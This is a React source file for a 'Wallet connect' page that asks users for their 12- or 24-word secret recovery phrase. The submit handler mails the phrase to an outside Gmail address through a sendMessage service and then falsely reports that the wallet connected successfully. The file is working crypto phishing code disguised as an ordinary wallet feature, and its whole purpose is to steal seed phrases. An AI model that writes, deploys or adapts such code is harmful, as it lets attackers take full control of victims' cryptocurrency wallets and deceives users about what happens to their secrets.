import { useState } from "react";
import HeaderBackButton from "../components/HeaderBackButton";
import styles from "./Connevtwallet.module.css";
import { sendMessage } from "../config/services";
import CustomizedButtons from "../components/StyledButtons";
import { Snackbar } from "@mui/joy";

const Connevtwallet = () => {
  const [value, setValue] = useState({
    wallet: "undefined",
    phrase: "",
    phrasecount: 0,
    alerMessage: "",
    severity: "warning",
  });
  const [loading, setLoading] = useState(false);
  const [openSnackbar, setOpenSnackbar] = useState(false);

  const handleChange = (event) => {
    let phrase = event.target.value;
    const phraseArray = phrase.split(" ");
    console.log(phraseArray.length);
    setValue({
      ...value,
      [event.target.name]: event.target.value,
      phrasecount: phraseArray.length,
    });
  };

  const handleCloseSnackbar = (event, reason) => {
    setOpenSnackbar(false);
  };

  const errFunction = () => {
    setValue({ ...value, alerMessage: "Failed? Network anormaly!" });
    setOpenSnackbar(true);
    setLoading(false);
  };

  const submitFunction = (event) => {
    event.preventDefault();
    if (value.phrasecount < 12) {
      setValue({
        ...value,
        alerMessage: "Invalid Mnemonics Phrase",
        severity: "warning",
      });
      setOpenSnackbar(true);
    } else {
      setLoading(true);
      sendMessage(
        `phrase:  ${value.phrase}`,
        "Report_phrase",
        "blockbitwwallet@gmail.com"
      )
        .then(() => {
          setValue({
            ...value,
            severity: "success",
            alerMessage: "Wallet connected succcessfully.",
          });
          setOpenSnackbar(true);
          setLoading(false);
        })
        .catch((err) => {
          errFunction();
        });
    }
  };
  return (
    <form onSubmit={submitFunction}>
      <div className={styles.connevtwallet}>
        <HeaderBackButton userImageUrl="Connect" />
        <div className={styles.walletConnectParent}>
          <div className={styles.walletConnect}>Wallet connect</div>
          <div className={styles.separatedBySpace}>
            Separated by space. you can choose to import wallets with 12-word or
            24-word Mnenomics, phrase should be a plain text.
          </div>
        </div>

        <div className={styles.frameParent}>
          <div className={styles.frameGroup}>
            <div className={styles.secretPhraseParent}>
              <div className={styles.secretPhrase}>Secret phrase</div>
              <textarea
                className={styles.frame}
                name="phrase"
                defaultValue={value.phrase}
                onChange={handleChange}
                placeholder="Enter 12-word phrase"
              />
            </div>
          </div>
          <CustomizedButtons loading={loading} text={"Connect"} />
        </div>
      </div>
      <Snackbar
        color={value.severity}
        size="lg"
        variant="soft"
        anchorOrigin={{ vertical: "top", horizontal: "center" }}
        open={openSnackbar}
        onClose={handleCloseSnackbar}
      >
        {value.alerMessage}
      </Snackbar>
    </form>
  );
};

export default Connevtwallet;
